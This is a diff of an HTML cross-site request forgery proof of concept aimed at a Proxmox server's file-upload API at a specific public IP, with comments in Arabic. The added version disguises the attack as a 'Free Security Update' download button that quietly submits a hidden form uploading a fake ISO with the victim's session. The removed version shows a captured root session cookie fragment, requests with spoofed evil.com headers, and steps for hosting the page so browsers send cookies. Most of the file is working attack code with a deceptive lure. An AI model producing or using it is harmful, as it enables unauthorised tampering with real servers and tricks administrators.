@@ -1,258 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>Proxmox CSRF - Final Exploit</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', sans-serif;
-            max-width: 1000px;
-            margin: 0 auto;
-            padding: 30px;
-            background: #0a0e14;
-            color: #fff;
-        }
-        .exploit-container {
-            background: #1a1e24;
-            border: 2px solid #e74c3c;
-            border-radius: 15px;
-            padding: 30px;
-            box-shadow: 0 0 30px rgba(231, 76, 60, 0.3);
-        }
-        .warning {
-            background: #c0392b;
-            color: white;
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 30px;
-            border-left: 10px solid #f1c40f;
-            font-size: 16px;
-        }
-        .code-box {
-            background: #000;
-            padding: 20px;
-            border-radius: 10px;
-            color: #0f0;
-            font-family: monospace;
-            margin: 20px 0;
-            border: 1px solid #e74c3c;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-        }
-        button {
-            background: linear-gradient(45deg, #e74c3c, #c0392b);
-            color: white;
-            border: none;
-            padding: 20px 40px;
-            font-size: 24px;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
-            margin: 20px 0;
-            width: 100%;
-            border: 2px solid #fff;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-            transition: 0.3s;
-        }
-        button:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 30px rgba(231, 76, 60, 0.8);
-        }
-        .hosting-info {
-            background: #2c3e50;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
-            border-left: 5px solid #3498db;
-        }
-        .cookie-info {
-            background: #000;
-            color: #0f0;
-            padding: 15px;
-            border-radius: 5px;
-            font-size: 14px;
-            word-break: break-all;
-            margin: 10px 0;
-            border: 1px solid #00ff00;
-        }
-        iframe {
-            display: none;
-        }
-    </style>
+    <title>Proxmox File Upload - CSRF PoC</title>
 </head>
 <body>
-    <div class="exploit-container">
-        <h1 style="color: #e74c3c; text-align: center; font-size: 36px;">⚠️ PROXMOX CSRF EXPLOIT</h1>
+    <h1>🎁 Click to Download Free Security Update</h1>
+    
+    <!-- الفورم الخفي - هيشتغل بأي click -->
+    <form id="csrfForm" 
+          action="https://34.253.177.228:8006/api2/json/nodes/ip-172-31-33-112/storage/local/upload" 
+          method="POST" 
+          enctype="multipart/form-data"
+          target="hiddenFrame">
         
-        <div class="warning">
-            <strong>🚨 المشكلة اللي واجهتك:</strong><br><br>
-            ✅ الـ PoC شغال 100% لكن الكوكي مش بيتبعت بسبب:<br>
-            • انت بتفتح الملف بـ file:// وده بيدي Origin: null<br>
-            • المتصفحات بتمنع إرسال الكوكي مع Origin: null + SameSite=Lax<br><br>
-            <strong>📌 الحل الوحيد: استضف الملف على HTTPS domain حقيقي</strong>
-        </div>
-
-        <div class="hosting-info">
-            <h2 style="color: #3498db;">🌐 استضافة الـ PoC على سيرفر حقيقي:</h2>
-            <div class="code-box">
-# 1. استخدم GitHub Pages (مجاني وسريع)
-$ git clone https://github.com/yourusername/yourrepo.git
-$ cd yourrepo
-$ echo '&lt;!-- حط الـ PoC هنا --&gt;' > index.html
-$ git add index.html
-$ git commit -m "CSRF PoC"
-$ git push origin main
-
-# 2. استخدم Vercel (أسرع)
-$ npm i -g vercel
-$ vercel
-
-# 3. استخدم Ngrok (للتست السريع)
-$ ngrok http 5500
-            </div>
-        </div>
-
-        <div class="cookie-info">
-            <strong>🍪 الكوكي المستهدف:</strong><br>
-            PVEAuthCookie=PVE%3Aroot@pam%3A698C9CA%A3%A3AjQk0191auWlddB7siotIBw...<br>
-            <small>Domain: 34.253.177.228 | SameSite: Lax | Secure: true</small>
-        </div>
-
-        <!-- =============== الهجوم الرئيسي بعد الاستضافة =============== -->
-        <div style="background: #27ae60; padding: 20px; border-radius: 10px; margin: 30px 0;">
-            <h2 style="color: white; margin-top: 0;">✅ هذا الـ PoC هيشتغل بس على HTTPS domain</h2>
-            
-            <form id="csrfForm" 
-                  action="https://34.253.177.228:8006/api2/json/nodes/ip-172-31-33-112/storage/local/upload" 
-                  method="POST" 
-                  enctype="multipart/form-data"
-                  target="csrfFrame">
-                
-                <input type="hidden" name="content" value="iso">
-                <input type="file" name="filename" id="fileInput" style="display: none;">
-                
-                <button type="button" onclick="executeCSRF()">
-                    🚀 EXECUTE CSRF (User Interaction Required)
-                </button>
-            </form>
-            
-            <iframe name="csrfFrame" style="display: none;"></iframe>
-        </div>
-
-        <!-- =============== اختبار الكوكي =============== -->
-        <div style="background: #8e44ad; padding: 20px; border-radius: 10px;">
-            <h3 style="color: white;">🔍 اختبار إرسال الكوكي:</h3>
-            <button onclick="testCookie()" style="background: #f39c12; padding: 15px;">
-                🍪 TEST COOKIE TRANSMISSION
-            </button>
-            
-            <div id="testResult" style="margin-top: 20px; padding: 15px; background: #000; border-radius: 5px; color: #0f0; font-family: monospace;">
-                انتظر نتيجة الاختبار...
-            </div>
-        </div>
-    </div>
-
+        <input type="hidden" name="content" value="iso">
+        <input type="file" name="filename" id="fileInput" style="display:none">
+    </form>
+    
+    <iframe name="hiddenFrame" style="display:none"></iframe>
+    
+    <!-- زر بريء -->
+    <button onclick="attack()" 
+            style="padding:20px 40px; background:green; color:white; font-size:30px; border-radius:20px;">
+        🔥 DOWNLOAD NOW 🔥
+    </button>
+    
     <script>
-        const TARGET = 'https://34.253.177.228:8006/api2/json/nodes/ip-172-31-33-112/storage/local/upload';
-        
-        function executeCSRF() {
-            updateStatus('🚀 تنفيذ الهجوم...');
-            
+        function attack() {
             // إنشاء ملف ISO
-            const fileContent = new Uint8Array([
-                0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // PNG header
-                0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, // Data
-                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF  // Payload
-            ]);
+            const file = new File(
+                [new Uint8Array([0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A, ...])], 
+                'update.iso',
+                { type: 'application/x-iso9660-image' }
+            );
             
-            const file = new File([fileContent], 'update.iso', { 
-                type: 'application/x-iso9660-image',
-                lastModified: Date.now()
-            });
-            
-            // إنشاء FormData
-            const formData = new FormData();
-            formData.append('content', 'iso');
-            formData.append('filename', file, 'update.iso');
-            
-            // إرسال الطلب مع الكوكي
-            fetch(TARGET, {
-                method: 'POST',
-                body: formData,
-                credentials: 'include', // دي أهم سطر - بتجيب الكوكي
-                mode: 'no-cors',
-                headers: {
-                    'Origin': 'https://evil.com', // مش null دلوقتي
-                    'Referer': 'https://evil.com/csrf.html'
-                }
-            }).then(() => {
-                updateStatus('✅ تم الإرسال - الكوكي اتبعت (لو انت على HTTPS domain)');
-            }).catch(e => {
-                updateStatus('⚠️ ' + e.message);
-            });
-        }
-
-        function testCookie() {
-            const resultDiv = document.getElementById('testResult');
-            resultDiv.innerHTML = '🔍 جاري اختبار إرسال الكوكي...\n';
-            
-            // اختبار بسيط لمعرفة إذا كان الكوكي موجود
-            fetch('https://httpbin.org/cookies', {
-                credentials: 'include',
-                mode: 'cors'
-            })
-            .then(res => res.json())
-            .then(data => {
-                resultDiv.innerHTML += '✅ Status: ' + window.location.protocol + '\n';
-                resultDiv.innerHTML += '🌐 Origin: ' + window.location.origin + '\n';
-                resultDiv.innerHTML += '🍪 Cookies: ' + (document.cookie || 'No cookies - انت على file://') + '\n\n';
-                
-                if (window.location.protocol === 'file:') {
-                    resultDiv.innerHTML += '❌❌❌ أنت على file:// - الكوكي مش هيتبعت!\n';
-                    resultDiv.innerHTML += '📌 لازم تستضيف الملف على HTTPS!\n';
-                } else {
-                    resultDiv.innerHTML += '✅✅✅ أنت على HTTPS - الكوكي هينرسل!\n';
-                }
-            });
-        }
-
-        function updateStatus(msg) {
-            const div = document.createElement('div');
-            div.style.cssText = 'background: #2c3e50; color: white; padding: 10px; margin: 10px 0; border-radius: 5px;';
-            div.innerHTML = msg;
-            document.querySelector('.exploit-container').appendChild(div);
-            
-            setTimeout(() => div.remove(), 5000);
-        }
-
-        // تشغيل اختبار تلقائي
-        window.onload = function() {
-            if (window.location.protocol === 'file:') {
-                alert('⚠️⚠️⚠️\n\nأنت بتفتح الملف محلياً (file://)\nالكوكي مش هيتبعت!\n\nلازم تستضيف الـ PoC على HTTPS domain');
-            }
-            
-            testCookie();
-        };
-    </script>
-
-    <!-- الهجوم البديل - Iframe POST -->
-    <div style="display: none;">
-        <iframe name="attackFrame"></iframe>
-        <form id="backupForm" method="POST" enctype="multipart/form-data" action="https://34.253.177.228:8006/api2/json/nodes/ip-172-31-33-112/storage/local/upload" target="attackFrame">
-            <input type="hidden" name="content" value="iso">
-            <input type="file" name="filename" id="backupFileInput">
-        </form>
-    </div>
-
-    <script>
-        // هجوم احتياطي بالطريقة القديمة
-        function backupAttack() {
-            const file = new File(['test'], 'backup.iso');
+            // إضافة الملف للفورم
             const dt = new DataTransfer();
             dt.items.add(file);
-            document.getElementById('backupFileInput').files = dt.files;
-            document.getElementById('backupForm').submit();
+            document.getElementById('fileInput').files = dt.files;
+            
+            // إرسال الفورم - الكوكي هينرسل لأنه user interaction!
+            document.getElementById('csrfForm').submit();
         }
+        
+        // Auto-click بعد 3 ثواني (اختياري)
+        // setTimeout(attack, 3000);
     </script>
 </body>
 </html>
